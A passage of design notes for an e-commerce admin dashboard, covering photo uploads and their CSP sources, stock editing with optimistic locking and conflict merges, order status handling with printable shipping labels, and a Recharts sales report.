- **Checks before the upload, in the API's order** (`photo-file-check.ts`, the rules in `@goshop/shared`'s `schemas/product-image.ts`). First the size (5 MiB, known without reading the file); then the first bytes, with the same signatures as Go's `http.DetectContentType` that the API runs at confirm (JPEG `FF D8 FF`, PNG `89 50 4E 47…`, WebP `RIFF…WEBPVP`); then the pixels, by decoding the preview (at most 6000 a side and 24 megapixels, the API's decompression-bomb limit). The upload declares the **sniffed** type, not `file.type`, which the browser guesses from the extension: a PNG saved as `foto.jpg` uploads correctly as `image/png` instead of being refused after the upload. A GIF or an iPhone HEIC gets a message that says what to do. The limit of 10 photos counts what the API counts (every photo, pending ones too) plus the uploads it has not recorded yet; files beyond it are refused at once, by name.
- **Previews from object URLs.** `URL.createObjectURL(file)` gives a `blob:` URL that shows the chosen file before a byte is uploaded, and stays on the tile while the worker processes the photo (the API has no thumbnail until `ready`). Each URL keeps its file in memory until revoked, so the hook revokes it when the upload is removed, cancelled or settled (its photo is ready), and every remaining one when the page goes; Playwright counted 15 created and 15 revoked over a whole session.
- **Two uploads at once.** Ten photos started together would split the seller's upload bandwidth ten ways, so each finishes late, and a retry storm on a bad connection would be ten times as big. Two keep the line busy while one confirms. The queue is an effect: whenever the uploads change, queued ones start while fewer than two are running.
- **Every step can fail on its own, and a retry resumes there.** The start failed: start again. The PUT failed on the network: send the file again to the same URL while it is valid. The URL expired (403 from the storage, or the clock), or the storage refused it for another reason (any other 4xx, such as a signature mismatch or a bucket policy, which the same signed request would meet again): delete the old pending photo first, because it holds one of the 10 slots, then ask for a new URL. The confirm's answer was lost: confirm again (the API answers a confirmed photo again). The API refused the file at confirm (`422 UPLOAD_INVALID`): it already deleted the pending photo; if the reason is the bytes themselves (`not_an_image_of_the_declared_type`, `unreadable_image`, `too_many_pixels`), there is no "Coba lagi", because the same file would fail again. The worker could not process it (`failed`): "Unggah ulang" deletes that photo and uploads the same file again, while the page still has it.
- **Cancel cleans up.** "Batalkan" aborts the request on its way (the XHR, or the API call through its `AbortSignal`) and deletes the pending photo, so it does not hold a slot. Leaving the page does the same for every upload still running, and while one is running, closing the tab asks first (`beforeunload`). A confirm already sent is never undone: the photo may be real by then. What a cancel cannot reach (a start whose answer never arrived) is a pending photo the API deletes by itself after a day.
- **The cache is updated from the answers.** Each photo request answers the photo it changed; `image-cache.ts` puts it into the product's detail query (`setQueryData`) instead of refetching the whole product, and marks the table stale (its thumbnail is the first ready photo). A detail refetch already on its way (the poll below, the window regaining the focus) may have read the product before that answer, so it is cancelled first (`cancelQueries`), or its older copy would land over the change: TanStack Query's pattern for writing into a query by hand, without its `await`. The cancel takes effect at once (the fetch's answer is dropped, and the query is put back as it was before that fetch), and a write by hand also becomes what a cancel puts back, so `setQueryData` can follow straight away and the callers stay synchronous. The edit form is not disturbed: photos are not part of it, and a refetch while a photo processes never overwrites what the seller is typing (in artikel 03 the form took the product once, when it mounted; since artikel 05 a form with no changes follows the query, and a form with changes keeps them).
- **Polling, bounded** (`hooks/useProcessingPoll.ts`). There is no endpoint for one photo and no event for "ready" (the dashboard's event stream is about orders, artikel 09), so the page asks: the product again after 1, 2, 3, 5, then every 8 seconds, only while some photo is `processing`. The worker picks up new photos every 30 seconds, so the first looks are quick and the later ones do not hammer the API. After two minutes it stops, with a `role="alert"` ("lebih lama dari biasanya") and "Periksa lagi", which starts a new round. When the set of processing photos changes (one became ready, a new one was confirmed), the backoff starts over from a short wait.
- **Delete asks first** (the same `ConfirmDialog` as archiving): a photo the storefront may be showing disappears, with its files, and that cannot be undone. Removing an upload that never finished does not ask: nothing the storefront shows is lost. After either, the button that was pressed is gone with its tile, so the focus goes to the section's heading rather than falling to `<body>`.
- **Order and the main photo.** The API has no endpoint to reorder photos or choose a main one: photos keep the order they were uploaded in, and the first ready one is the storefront's main photo and the table's thumbnail. The page says so, and offers nothing it cannot do. The confirm sends an empty `alt`, which the storefront replaces with the product's name; the API has no way to edit it later.
- **Accessibility.** The file dialog is opened by a real `<button>` ("Pilih foto"); the `<input type="file">` is `hidden`, out of the Tab order, because a file input cannot be styled and reads differently in every browser. The drop area is an extra for a mouse, never the only way. Each tile is a list item named by its file name or "Foto 3"; every button carries that name for a screen reader ("Hapus Foto 3", "Coba lagi depan.jpg"), as visible text plus a `sr-only` part. The progress bar is the native `<progress>` (a progressbar to a screen reader, named "Mengunggah depan.jpg"). A refused or failed file's reason is a `role="alert"`. One `role="status"` line says what is going on in milestones ("Mengunggah 2 foto. 1 foto sedang diproses."), not every percent. Status is always words, never colour alone; the spinner stops under `prefers-reduced-motion`.
- **Where the endpoint functions live: `@goshop/shared`** (`startProductImageUpload`, `confirmProductImage`, `deleteProductImage` next to the product endpoints), with the generated types (`ImageUpload`, `ImageUploadTicket`, `AdminProductImageStatus`, `ProductImageContentType`), and the rules in `schemas/product-image.ts`, ready for the mobile app. The XHR upload and the image decoding stay in the dashboard: they need the DOM.

### The CSP

Three sources are involved, and each is allowed exactly once:

```
img-src     'self' data: blob: {$IMAGE_ORIGIN}   # the API's sizes, and the local previews
connect-src 'self' <API origin> {$UPLOAD_ORIGIN} # the API, and the presigned PUT
```

- `connect-src {$UPLOAD_ORIGIN}`: the `PUT` is a request from script, so `connect-src` governs it, not `img-src`. It was already in the policy from artikel 01, set at run time. A bucket needs its own CORS rule allowing `PUT` with `Content-Type` from the dashboard's origin (local SeaweedFS answers CORS for any origin).
- `img-src {$IMAGE_ORIGIN}`: the `ready` photos' variants, from the bucket's public URL or a CDN.
- `img-src blob:` is the one new source this article adds (`apps/admin/Caddyfile`). A `blob:` URL can only be made by the page itself, from a file the seller picked: no other origin can hand one to it, and it is allowed for images only, not for scripts, styles or `connect-src`. `data:` stays for what it was before.

Checked in the built image: with `IMAGE_ORIGIN` and `UPLOAD_ORIGIN` set, a variant from the image origin loads, the `blob:` preview renders and the `PUT` goes through, with no CSP violation in the console.

## Manajemen stok dan varian (artikel 05)

The edit page (`/produk/<id>`) gets a **Stok** section above the form (every variant's stock as the server has it, its badge, and "Ubah stok"), the variant step shows what each stock was when the form loaded and which variants a save will archive, and a save refused with **409** no longer throws the seller's work away: the form shows what changed on the server next to what the seller changed, and lets them keep their changes on top of the latest data or drop them.

### The mental model

| Idea                                        | What it means                                                                                                                                                                                                                                                                                                                         | Go comparison                                                                    |
| ------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| **Stock is shared with checkouts**          | A variant's stock changes without anyone in the dashboard touching it: a checkout takes units (Bab 5, row locks in id order), a cancelled or expired order gives them back. Each of those writes bumps the variant's `version`, never the product's                                                                                   | Two writers of one row: a short `FOR NO KEY UPDATE` and a long-lived form        |
| **Optimistic locking, seen from the UI**    | Two locks. The form keeps the product's `version` and each variant's `version` as loaded and sends them all back. The API checks the product's first (another admin's save or archive: 409 `VERSION_CONFLICT`, `details.product_id`), then each variant's (a checkout came first: `details.variant_id`), and writes nothing on either | `if n == 0 { return ErrVersionConflict }` after the guarded `UPDATE`             |
| **A three-way merge after a 409**           | Three copies of the product: what the form loaded (base), what it holds (mine), what the server has now (latest, fetched after the 409). Changed on one side only: that side wins. Changed on both: the seller chooses                                                                                                                | `git merge`: base, ours, theirs, and a conflict only where both changed one line |
| **A difference composes, a count does not** | "+20 received" is right whatever was sold meanwhile (apply it to the current stock). "I counted 15" is only right if nothing moved since the count; if something did, only the seller knows which number is true                                                                                                                      | `UPDATE … SET stock = stock + $1` versus `SET stock = $1 WHERE stock = $seen`    |

### Decisions

- **The threshold comes from the API where the API sends it.** The rule is `LowStockThreshold` in `apps/api/internal/product/table.go`, and `GET /v1/admin/products` answers it as `low_stock_threshold` next to the rows. The table reads that: the filter's label ("Stok menipis (≤ 5)", without the number until the first page arrives) and the badges' "5 unit atau kurang" (passed to the stock cells as TanStack Table's `meta`). A product's level there comes from the API's totals (`productStockLevel`): "Stok habis" when its sellable variants have nothing left together, "Stok menipis" when the API's `low_stock` is true, so the table and the `stok=menipis` filter never disagree. `GET /v1/admin/products/{id}` carries no threshold, so the edit page (the Stok panel, the variant step, Tinjau) still uses `LOW_STOCK_THRESHOLD = 5` and `stockLevel` from `@goshop/shared` (`schemas/product.ts`), a copy kept equal to the API's by hand; if the API's ever changes, those badges disagree with the table until the copy changes too, and the comment says so. A level is "out" at 0, "low" from 1 to the threshold, else "ok"; `StockBadge` shows "Stok habis" (filled) or "Stok menipis" (outlined), always as a word.
- **The variant editor** (step "Varian & harga"). A variant is what a buyer picks: its name ("M", "Merah") is the option value, with its own SKU, price, stock and weight. The contract has no option types (size × colour), so the dashboard offers none. Each variant's legend carries the badge for the stock being typed, and an existing variant's stock field says what it was when the form loaded ("Saat dibuka: 24."): the number a checkout may change before the seller saves. "Total stok" sums the list.
- **Removing an existing variant archives it, and that cannot be undone.** The API archives every sellable variant the `PUT` leaves out (never deletes: order lines point to it), and an archived variant can be neither written again (its `id` is refused) nor recreated (its SKU stays taken, archived variants included). So a removed variant is listed under the list as "Akan diarsipkan saat disimpan" with "Batalkan", which puts it back where and as it was loaded (focus on its SKU), and "Tinjau" repeats the list. The step says what to do for a variant that is only sold out: keep it with stock 0.
- **"Ubah stok": one request, the API does the arithmetic.** `POST /v1/admin/products/{id}/variants/{variant_id}/stock-adjustments` changes one variant's stock in one guarded statement (`adjustVariantStock` in `@goshop/shared`, `useQuickStockChange`, the pure parts in `stock.ts`). Nothing is read first and nothing else of the product is sent, so no other variant's version moves and no other open form gets a needless 409. Two ways to change:
  - **"Tambah atau kurangi"** (the default): `{ "delta": 20 }`, added to the stock as it is when the change runs. 7 on screen, 2 sold while the seller typed "+20": the result is 25, not 27, and the sale stays sold. A result below 0, or an increase past 1,000,000, is 409 `STOCK_OUT_OF_RANGE` with the stock now ("Stok sekarang 3; tidak bisa dikurangi sebanyak itu."). Only an increase is capped: a cancellation can restore stock above the maximum, and lowering it from there must still work. Such a stock also fails the edit form's schema (0–1,000,000), so the variant step's stock field then says why ("Stok di server melewatinya karena pesanan yang dibatalkan mengembalikan unitnya") and what to do: write the right number, or lower it with "Ubah stok".
  - **"Setel jumlah"**: `{ "set": 12, "expected": 7 }`, a count written only while the stock is still the one on screen when the editor opened. If a sale or a cancellation moved it, the answer is 409 `STOCK_CHANGED` with the stock now, and nothing is saved; the editor says "berubah dari 7 menjadi 5" and offers "Tetap setel 12" (sent again with `expected: 5`, so it is checked again) or "Pakai 5 + 5 = 10" (the seller's difference, sent as a delta). The API compares the stock, not the version: a price edit in between moves the version but takes nothing from anyone's count.

  `VARIANT_ARCHIVED` (409) or `NOT_FOUND` closes the editor with "sudah diarsipkan". On success the answered variant (new stock, new `version`) replaces its copy in the product's cache, after `await cancelQueries` on the detail query (a refetch already on its way, such as the one when the window regains the focus, may have read the stock before the change and would put it back), and the table is invalidated; the product's `version` does not move. After any 409 the product is refetched, so the panel shows the stock the API reported. Every 409 is a result the editor shows, not an error: only the network and the server's own failures become a message. A known limitation: when a quick change lands while the conflict review is loading the latest product (`loadLatest`, a few hundred milliseconds), that cancel also cancels the review's refetch, which then resolves with the product as it was before; the review merges against that older copy, so the next save gets a 409 again and the review opens with the real latest product. Nothing is overwritten; it costs one more round.

- **A form with no changes follows the server.** Artikel 03 took the product once, on mount. Now the edit form compares the query's product with what it started from, and if the seller has changed nothing it resets to the new product (versions included), so a quick stock change above it (a new variant `version`), or a background refetch after another admin's save (a new product `version`), does not make its next save fail. A form with changes keeps them (they are the seller's) and says, under its step heading, that the product changed on the server and that saving will show both.
- **The save sends the product's `version`.** `productToFormValues` keeps it next to the variants' versions (no input shows it, `productSchema` passes it through), so the `PUT` carries the version the form loaded; after a merge, the latest product's. Without it the API answers 400.
- **Every 409 of a save opens one review instead of a reload button** (`ProductConflictReview`, `product-merge.ts`). Three causes (`conflictCause`), one merge, and the review's first sentence says which:
  - `VERSION_CONFLICT` with `details.product_id`: another admin saved or archived the product, maybe adding or archiving variants. The API checks this first, so a variant another admin added is reported here instead of being archived by a form that never saw it;
  - `VERSION_CONFLICT` with `details.variant_id`: only that variant's stock can have moved (a checkout, a cancel, a quick stock change); any admin save would have moved the product's version. The variant is listed first, "stok varian ini berubah";
  - `VARIANT_ARCHIVED` with `details.variant_id`: the body names a variant that is archived. This is the API's fallback, not the race: every archive goes through a save, which bumps the product's `version`, so a form that loaded the product before another admin archived a variant gets the product's `VERSION_CONFLICT` above. Only a body that carries the current product `version` with a variant archived before the variants were read (one built from an older copy of them) reaches it. A code of its own since the backend's fix; `toProductApiErrors` no longer reads the 400's message. So the review does not say "while you edited": it says the form still holds a variant the server has archived, which can no longer be written.

  The form fetches the product (`loadLatest`) and merges, field by field, comparing values the way the schema sends them ("89.000" and "89000" are one price):
  - changed only on the server → the server's value. The stock a checkout took is taken, never written over, and the seller does nothing for it;
  - changed only by the seller → the seller's;
  - changed by both, differently → a conflict: a radio group with "Milik Anda", "Dari server" and, for stock, "Server ditambah perubahan Anda" (latest + (mine − base): "I added 6" typed as 30 over 24, while 2 were sold, is 28). Nothing is pre-selected, so a choice is always the seller's;
  - a variant someone else added is kept, with its `version` (leaving it out of the next `PUT` would archive it), one someone else archived is dropped with a sentence (it can no longer be written; the sentence says "oleh admin lain", although it may as well be the same seller in another tab: the API does not say who archived it), one the seller removed stays removed, the seller's new variants stay new.

  The review shows a table per part ("Saat dibuka", "Perubahan Anda", "Di server sekarang", with "dipakai" written where a value wins), the variant the API named first (`details.variant_id`), and a count ("4 perubahan di server, 1 di antaranya …"). "Terapkan perubahan saya ke data terbaru" resets the form to the latest product (the new base, whose versions, the product's and the variants', the next save sends) and puts the merged values on top (`reset(latest)`, then `reset(merged, { keepDefaultValues: true })`, so the form is dirty with exactly the seller's changes), then opens "Tinjau" to save from there. "Buang perubahan saya" resets the form to the latest product. Neither saves: the seller sees the result first.

- **Accessibility.** "Ubah stok M" is a disclosure button (`aria-expanded`, `aria-controls`); the editor's input takes the focus, Escape closes it and every way out returns the focus to its button (to the section heading if the variant disappeared). The preview ("Stok sekarang 7, menjadi 27.") is polite; a moved count is a focused `role="alert"`; the panel announces "Stok M: 5 → 25. Tersimpan." in its `role="status"`. The quick change's input is a text input, not `numeric`: a phone's number pad has no minus sign. The review's heading takes the focus when it opens and keeps it when the latest product arrives: the review is one `<section>` with one `<h2>` for loading, error and ready, and only what is under the heading changes (two headings, one per state, would be two elements, and the focus would fall to `<body>` when the second replaced the first). The tables have row headers, each conflict is a native fieldset with a legend ("Stok M (KF-M): nilai mana yang disimpan?"), the arrow keys choose, and a missing choice is an alert with the focus on the first group left open. Removing and restoring a variant are announced.

Checked in Chromium with the API mocked to the contract: the table's threshold from its response; a save sending the product's `version`; a product 409 after another admin added a variant (the variant kept, saved with the latest versions); a variant 409 with a stock conflict chosen by keyboard; `VARIANT_ARCHIVED`; a quick "+20" sent as `{ "delta": 20 }`, a count sent as `{ "set", "expected" }`, `STOCK_CHANGED` (7 → 5, "Pakai 5 + 5 = 10") and `STOCK_OUT_OF_RANGE`; a pristine form following a quick change; the review's heading still focused after the latest product arrived 500 ms late; a quick change not undone by a focus refetch that read the stock before it and answered 1.5 s later; a stock of 1,000,005 explained in the variant step; no console error.

## Manajemen order: ubah status, cetak resi (artikel 06)

`/pesanan` is the order queue, one status at a time (the paid orders by default: the ones to pack), `/pesanan/<id>` one order with everything needed to fulfil it and the buttons that move it on, and `/pesanan/<id>/resi` the shipping label and packing slip, for paper. The endpoints exist since Bab 5 (ADR 0006); this article is the dashboard's half, plus Bab 12's one change to them: only an admin may cancel.

### The mental model

| Idea                                 | What it means                                                                                                                                                                                    | Go comparison                                                         |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------- |
| **A queue per status**               | `GET /v1/admin/orders?status=…` lists one status, newest first. Each tab is a link to its status (`/pesanan?status=diproses`), and each status is its own cache entry                            | One `WHERE status = $1` query per screen                              |
| **Cursor pages that append**         | "Muat lebih banyak" asks for the page after the last order seen (`next_cursor`) and adds it under the list (`useInfiniteQuery`), instead of jumping to page N like the product table             | Keyset pagination: the next page starts after the last row seen       |
| **A status machine, checked twice**  | `orderActions(order)` offers only the changes the life cycle allows from the order's status; the API checks the same table and answers 409 `INVALID_TRANSITION` when someone else moved it first | `order.CanTransition`, and the guarded `UPDATE … WHERE status = ANY`  |
| **The answer is the new order**      | Every change answers the order after it; it goes straight into the detail query, and every queue is marked stale (the order left one status for another)                                         | A handler that returns the row `UPDATE … RETURNING` gave it           |
| **One key factory for every reader** | `orderKeys` names every order query; the actions, the print view and artikel 09's live events all invalidate through it (`invalidateOrderQueries`)                                               | One package that owns the cache keys, instead of strings in each file |

The life cycle, as the buttons follow it:

```
paid ──Proses pesanan──▶ processing ──Tandai dikirim (resi)──▶ shipped ──Tandai selesai──▶ completed
pending_payment, paid, processing ──Batalkan pesanan (admin)──▶ cancelled
```

### Decisions

- **Tabs are links, not ARIA tabs** (`OrderStatusTabs.tsx`). Each status is an address that can be bookmarked, opened in a new tab or reached with Back; that is a link. `role="tablist"` would promise arrow keys between panels of one page, which this is not. The queue on screen has `aria-current="page"`, and the style is written against that attribute. The URL holds an Indonesian word (`menunggu-bayar`, `dibayar`, `diproses`, `dikirim`, `selesai`, `dibatalkan`), like the product table's filters; no parameter, or a word the dashboard does not know, is the paid queue, so the sidebar's "Pesanan" and the "Dibayar" tab are the same address. Six links wrap onto a second line on a phone instead of scrolling sideways.
- **Why cursors here and page numbers in the product table.** A queue changes while it is read: orders are paid, packed and shipped by other people. With offsets, an order leaving the status between two pages shifts every later one, and the next page skips one. The cursor continues after the last order seen. The cost is no "page 5 of 9", which a queue worked from the top does not need. A refetch (after an action, or an event) reloads every loaded page in turn from the first, so the list stays one list from one moment.
- **"Muat lebih banyak" keeps the focus.** A browser takes the focus away from a `disabled` button, so while the next page loads the button is `aria-disabled` (a second press does nothing) and keeps the focus; when another page follows, it is still there, focused. After the last page the button is gone, so the focus moves to the first order that just arrived, where reading continues. A `role="status"` line says how many orders are shown ("Menampilkan 40 pesanan. Masih ada pesanan lain."). A failed page keeps what was loaded, says so as an alert, and the same button retries it.
- **What a change is offered is one function** (`order-actions.ts`, `orderActions(order)`). The detail page never looks at the status to decide a button; it asks this function, which in this article reads the status only. So at this point a seller still sees "Batalkan pesanan" and gets the API's 403, told plainly ("Hanya admin yang boleh membatalkan pesanan. Minta admin toko untuk membatalkannya."). Artikel 08 then added the role to this one function (`orderActions(order, role)`), and the button disappeared for a seller everywhere at once. The API remains the judge: a hidden button is a convenience, the 403 is the rule.
- **Which changes ask first.** "Proses pesanan" runs at once: it is the normal next step and the buyer sees only a new status. "Tandai dikirim" is a form, because it needs the resi. "Tandai selesai" asks, without red: it is final, and normally the buyer confirms receipt. "Batalkan pesanan" asks, in red: final, the stock and the voucher go back, and for a paid order the dialog says that the money is not refunded by it (refunds are Bab 6's challenge: return it through Midtrans). The dialog is artikel 03's `ConfirmDialog`, with "Jangan batalkan" as the safe answer and the focus starting on it.
- **The ship form asks for the resi only** (`ShipOrderForm.tsx`). The courier and service were chosen and paid for by the buyer at checkout, so the form shows them ("Kurir pilihan pembeli: JNE REG") and the resi must come from that courier. `shipOrderSchema` in `@goshop/shared` is the contract's rule, ready for the mobile app: 6–40 letters, digits or hyphens, trimmed and upper-cased first, as the API stores it, so `" jne0123456789 "` is sent as `JNE0123456789` and "JNE 0123" is refused with a sentence that says to copy it as it is on the receipt. The API checks it again; its field error lands on the field.
- **409: someone else moved it first.** Two people work the same queue, a buyer confirms receipt, an unpaid order expires: the order on screen can be out of date, and the API's guarded `UPDATE` refuses the change (`INVALID_TRANSITION`, with the status now in `details.status`). The mutation refetches the order and the queues before it settles (`useOrderAction`'s `onError` awaits it), so the message ("Pesanan ini sudah diubah orang lain: statusnya sekarang “Dibatalkan”. Data terbaru dimuat ulang; periksa sebelum melanjutkan.") appears together with the new status and the buttons that fit it. Nothing is retried by itself: what to do now is the seller's call. A 404 is handled the same way.
- **No answer is not a failure you can retry blindly.** When the change's `POST` gets no usable answer, the API may have made it anyway. That is true without an answer at all (`CLIENT_TIMEOUT`, or `NETWORK_ERROR`: the connection can drop after the request arrived), and for a server failure: the handler commits the change, then reads the order back for its answer under the same 15-second request deadline (`staffMove` in `apps/api/internal/order/admin.go`), so that read can still end in 503 `TIMEOUT` or 500 after the commit, and a gateway's 502 or 504 can arrive after the API finished. Sending the change again would then get the 409 above, and the page would say that someone else changed the order, which is false. So these (`actionFailure` → "uncertain") refetch the order, without waiting for that refetch (a server that did not answer may be slow again), and say so: "Server tidak menjawab tepat waktu, jadi belum pasti perubahan ini tersimpan. Data terbaru dimuat ulang; periksa statusnya, lalu ulangi hanya jika statusnya belum berubah." (the first half names the cause: no answer in time, the connection dropped, or a server error). Only what is refused before the handler runs stays a plain "retry": 429 `RATE_LIMITED` comes from the middleware, and another 4xx is a request the API turned down.
- **Where a failure is shown.** One that trying again can fix (429, a refused request) stays in the dialog, which stays open. One that it cannot, or that needs a look first (403, 409, 404, no answer, a 5xx), closes the dialog and is shown in the "Tindakan" panel as an alert that takes the focus, because the dialog's button would only fail again.
- **Focus after a change.** The buttons are different ones afterwards (the order moved), and the one pressed may be gone, so the focus goes to the panel's "Tindakan" heading and the notice under it (`role="status"`) says what happened; Tab continues to the next action, which after "Proses pesanan" is the resi field. A dialog closes first and returns the focus to its opener; the panel's effect runs after the dialog's (a parent's effects run after its children's) and moves it on.
- **The cache after a change.** The answer goes into `orderKeys.detail(id)` with `setQueryData` (no refetch: it is the order as stored), and `orderKeys.queues` is invalidated, not awaited: no queue is on screen during the change, and going back to `/pesanan` refetches it. Back in the paid queue, the processed order is gone.
- **The detail page shows what the order holds**: the lines as bought (names, SKUs, prices copied at checkout, so a product renamed since does not change the order), the totals with the voucher, the courier, the resi once shipped, the address and phone copied at checkout, the newest payment's status and when it was paid (or the payment deadline of an unpaid order), and a timeline. The contract has no time for "processing", so that step shows without one; a cancelled order's timeline shows only what happened. The buyer's name and email are not in the contract's order: the recipient on the address is who the parcel goes to.
- **The print view is outside the dashboard layout** (`routes.tsx`: a child of `RequireStaff`, not of `DashboardLayout`), so on screen and on paper the page is the paper: no sidebar, no header, no breadcrumb. Its `<main>` has the dashboard's id, so `useRouteFocus` still finds its `<h1>`. "Cetak" calls `window.print()`, the browser's own dialog (printer, paper size, "Save as PDF"); Ctrl+P does the same. The toolbar is `print:hidden` (Tailwind's print variant). The label carries the courier and service, the resi (a dash and a note before shipping: a label can be printed before the parcel is handed over), the order code, the recipient's name, phone and address, the sender, the weight; under a cut line, the packing slip lists every line's product, variant, SKU and quantity, **without prices**, because the slip travels inside the parcel and the recipient may not be the buyer. A cancelled or unpaid order says "Jangan dikirim" in a box, on screen and on paper.
- **Print colours** (`index.css`, section 4). In print the colour tokens are black on white whatever the device's theme: a browser drops backgrounds when printing, so dark mode's light text would print nearly invisible. `@page { margin: 10mm }` replaces the browser's wider default margin. Checked with Playwright's `page.emulateMedia({ media: "print", colorScheme: "dark" })`: white background, black text, the toolbar hidden.
- **Code splitting.** The detail page (React Hook Form, Zod and the ship schema) and the print view are lazy routes (`features/orders/lazy.ts`), like the product form; the queue, the page a seller lives on, stays in the main bundle.
- **Where the endpoint functions live: `@goshop/shared`** (`listAdminOrders`, `getAdminOrder`, `processOrder`, `shipOrder`, `completeOrder`, `cancelOrder`), with the generated types `ListAdminOrdersQuery`, `ShipRequest`, `OrderShipping`, `ShippingAddressSnapshot`, `Courier`, `OrderCancelReason`, and `shipOrderSchema` in `schemas/shipment.ts`.

## Grafik penjualan dengan Recharts (artikel 07)

`/laporan` is the sales report: for a range of days (the last 7, 30 or 90, or two chosen dates) and a grouping (per day, week or month), the range's revenue, orders and average order value, a revenue chart, an orders chart, every number as a table, and the five best-selling products. It reads `GET /v1/admin/reports/sales` (Bab 6), which does the arithmetic in SQL; the page only draws it. The overview page (`/`) gets a small "Penjualan 7 hari terakhir" tile from the same endpoint.

### The mental model

| Idea                                  | What it means                                                                                                                                                                                       | Go comparison                                                         |
| ------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
| **The server aggregates, we draw**    | Sums, empty periods, weeks from Monday, the running total and the top 5 come from the API (`generate_series`, window functions). The page never adds two numbers it could get wrong                 | The handler returns a view model; the template only formats it        |
| **A chart is a picture of a table**   | The same rows feed the charts and the data table. The charts are for the shape at a glance, the table for an exact figure and for anyone who cannot see the picture                                 | One query, two renderers                                              |
| **The URL is the report's state**     | `?rentang=7`, `?dari=…&sampai=…`, `?kelompok=minggu`: a bookmark opens the same report, Back undoes a choice (the product table's pattern, artikel 02)                                              | Query parameters parsed and validated per request                     |
| **A date is a Jakarta calendar date** | "2026-10-30" has no time and no zone. Today is computed at UTC+7, arithmetic runs on midnight UTC and formatting uses `timeZone: "UTC"`, so the browser's own zone can never shift a label by a day | `time.FixedZone("WIB", 7*3600)` and `t.Format(time.DateOnly)`         |
| **Recharts is code-split**            | The page is a lazy route: about 100 kB gzipped of chart code is downloaded the first time someone opens "Laporan", never by a seller who only works through orders                                  | A heavy dependency behind a build tag, linked only where it is needed |

### Decisions

- **The range.** Three presets and "Pilih tanggal", drawn as one segmented control that is a real radio group (`<fieldset>` with visually hidden radios inside their labels; the style is written against `has-checked`, the same fact a screen reader announces). Arrow keys move between the options, and a screen reader says "30 hari, 2 of 4". A preset moves with the calendar (a bookmark of `?rentang=7` shows the last 7 days whenever it is opened); chosen dates do not. A preset is still sent as two explicit dates, computed against today in Jakarta, the API's own "today": the query key then names exactly which days are cached, and after midnight WIB the same preset is a new key.
- **Validation mirrors the API, field by field** (`rangeErrors` in `report-params.ts`): both dates must be calendar dates (`2026-02-30` is refused, as Go's `time.Parse` refuses it, not rolled over into March as `new Date` would), the end may not be before the start, and the range is at most 366 days, both included (the API's `report.ErrRange`). The messages say what to do and land on the field that needs the change, which gets the focus. Unlike the API, both dates are required: the API's defaults for a missing date are what the presets are for. Nothing is fetched until "Terapkan", and nothing is fetched for an invalid range. Validate late, re-check early, as in the product form.
- **A URL is input.** `?dari=2026-02-30`, a 400-day range or `?kelompok=tahun` fall back to the default (the last 30 days, per day) instead of a 400 from the API. Defaults are left out of the URL.
- **Two charts, never two axes.** Revenue (millions) and orders (tens) on two scales in one frame would make their crossings meaningless; they are two charts, one measure each, one colour each, so no legend is needed (the heading names the series). "Tampilkan kumulatif" switches the revenue chart to the running total (`cumulative_revenue`) as an area: a sum that only grows reads as a line, not as separate bars.
- **Rupiah: compact on the axis, exact everywhere else.** The axis says "Rp1,65 jt" (`Intl.NumberFormat("id-ID", { notation: "compact" })`, up to two decimals so neighbouring ticks never contradict each other); the tooltip, the tiles and the tables say "Rp 1.650.000" (`formatRupiah` from `@goshop/shared`). The tooltip shows every number of the period (revenue, orders, average, running total), whichever chart it is on.
- **Periods are labelled with the days they count.** The API lists a week or a month by its first day, and the first week (from Monday) or month may start before the range, the last may end after it; only the range's days are counted. A label therefore shows the counted days and says "(sebagian)", so a short first week is not read as a slow one: "2–31 Agu 2026 (sebagian)", "September 2026", "12–18 Okt 2026".
- **Empty periods are real zeros.** The API lists every period, so a day without sales is a zero bar and a "Rp 0" row, and the chart's summary counts them ("6 dari 30 hari tanpa penjualan"). A range with no sale at all shows one sentence instead of empty charts.
- **Loading, error, busy.** The first load is a skeleton in the report's shape. After that, `placeholderData: keepPreviousData` keeps the last report on screen, dimmed and `aria-busy`, while the next range loads, so the controls never jump away from the pointer. An error without a report on screen is `ErrorState` with "Coba lagi". A failed refetch in the background (an order event, artikel 09, or the window regaining the focus) leaves the report there, still true for its range, with one line under the status saying it could not be updated and a small "Coba lagi"; a full error card over a valid report would read as if the report were wrong. `OrdersPage` makes the same choice. One `role="status"` line says what is on screen ("1–30 Okt 2026, per hari. Tanggal menurut WIB.") or "Memuat laporan…".
- **Accessibility.** A chart is not accessible by itself. Each svg is one image to a screen reader (`role="img"`), named like its heading plus the range, and described (`aria-describedby`) by the visible sentence under the heading, which states the peak and the empty periods. Recharts' keyboard layer stays on: Tab reaches a chart and the arrow keys move the tooltip, for sighted keyboard users. Every number is in **"Lihat data dalam tabel"**, a native `<details>` (a year by day is 366 rows, too long to sit open; `<details>` opens with Enter or Space and announces its state with no script), whose rows are headed by their period (`<th scope="row">`) and end with a total. The tiles are a `<dl>`, so each figure is read with its name. The top products are a table, not a chart: five names read faster as text, and each name links to its product. Products with the same revenue share a rank (the API's `rank`).
- **Colours from the theme.** The bars, the grid and the axis text use the design tokens as CSS variables (`fill="var(--primary)"`, `var(--border)`, `var(--muted-foreground)`): an SVG presentation attribute is a CSS value, so the charts follow dark mode with the rest of the page, with no second palette. Checked: in dark mode the bars compute to `#4493f8` and the ticks to `#9198a1`. Animations follow `prefers-reduced-motion` (Recharts' `"auto"`).
- **The size is CSS.** Recharts 3's `responsive` prop sizes the chart from its container (`className="h-64 w-full"`), without the `ResponsiveContainer` wrapper. At 375 px the page does not scroll sideways; the chart is 309 px wide.
- **The overview tile** asks for the same query as `/laporan?rentang=7&kelompok=minggu` (its link), so following it shows the report from the cache. It imports no chart code: Recharts stays out of the main bundle.
- **Where the endpoint function lives: `@goshop/shared`** (`getSalesReport` in `packages/shared/src/api/admin-reports.ts`), with the generated types `SalesReport`, `SalesReportPeriod`, `SalesReportTopProduct`, `SalesReportGroup` and `SalesReportQuery`.

### Recharts and the CSP

